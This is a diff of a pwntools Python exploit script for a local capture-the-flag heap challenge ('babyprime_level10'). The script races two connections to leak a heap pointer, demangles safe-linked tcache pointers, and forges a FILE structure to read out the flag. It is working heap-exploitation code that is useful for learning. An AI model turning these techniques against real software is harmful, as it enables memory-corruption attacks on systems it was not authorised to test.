@@ -1,7 +1,8 @@
 from pwn import *
 
 context.arch = 'amd64'
-
+BINARY = "/challenge/babyprime_level10.0"
+p = process(BINARY)
 def mangle(target:int, ptr:int, page_offset=0)->int:
     return target ^ ((ptr >> 12) + page_offset)
 
@@ -13,8 +14,8 @@ def demangle(raw:int, page_offset=0)->int:
 def warmup_heap(r):
     r.sendline(b'malloc 8')
     r.sendline(b'malloc 9')
-    r.sendline(b'malloc 10')
-    r.sendline(b'free 10')
+    # r.sendline(b'malloc 10')
+    # r.sendline(b'free 10')
     r.sendline(b'free 9')
     r.sendline(b'free 8')
 need_del = False
@@ -36,25 +37,17 @@ def thread2(r2, index):
                 print(leak)
                 print(f'mangled leak = {hex(unpack(leak, "all"))}'.encode('utf-8'))
                 global mangled_leak
-                mangled_leak = demangle(unpack(leak, 'all'), page_offset=-1)
+                mangled_leak = unpack(leak, 'all') << 12
                 return
 
-
-# BINARY = "/challenge/babyprime_level2.0"
 # secret_addr = 0x405460
 
 # p = process(BINARY)
 r1 = remote("127.0.0.1", 1337)
 r2 = remote("127.0.0.1", 1337)
 
-
-warmup_heap(r1)
-warmup_heap(r2)
-
-
 r1.clean(1)
 r2.clean(1)
-
 
 # heap_leak = get_heap_leak(r1, r2)
 t1 = Thread(target=thread1, args=(r1, 1))
@@ -66,6 +59,8 @@ need_del = True
 t1.join()
 print(f'heap_leak = {hex(mangled_leak)}')
 
+warmup_heap(r1)
+warmup_heap(r2)
 
 heap_leak = mangled_leak
 def thread4(r2, index, addr):
@@ -77,10 +72,10 @@ def thread3(r1, index, addr):
     for i in range(1000):
         r1.sendline(f'scanf {index} '.encode('utf-8') + addr)
 
-
+heap_leak = mangled_leak
 secret = b''
-secret_loc = ((heap_leak>>16)<<16) + 0x2fb0
-page_offsetxxx = -4 # 根据heap_leak的值算出来的
+secret_loc = ((heap_leak>>20)<<20) + 0xd50
+page_offsetxxx = 0 # 根据heap_leak的值算出来的
 
 while True:
     r1.sendline(f'malloc {1} printf {1}'.encode('utf-8'))
@@ -101,12 +96,18 @@ while True:
         t2.join()
         t1.join()
 
-r1.sendline(b'malloc 11 printf 11')
+r1.sendline(b'malloc 1 printf 1')
 r1.recvuntil(b'MESSAGE: ')
 result = r1.recvline()[:-1]
 print(result)
 
-r1.sendline(b'malloc 12 printf 12')
-r1.recvuntil(b'MESSAGE: ')
-result = r1.recvline()[:-1]
-print(result)
+flag_loc = ((heap_leak>>20)<<20) + 0x1110
+fs = FileStructure()
+payload = fs.write(flag_loc, 100)
+r1.sendline(b'malloc 2 scanf 2')
+r1.sendline(payload)
+# r1.sendline(b"printf 2")
+
+r1.sendline(b'xxx')
+result = p.clean()
+print(b"xxx:  " + result)
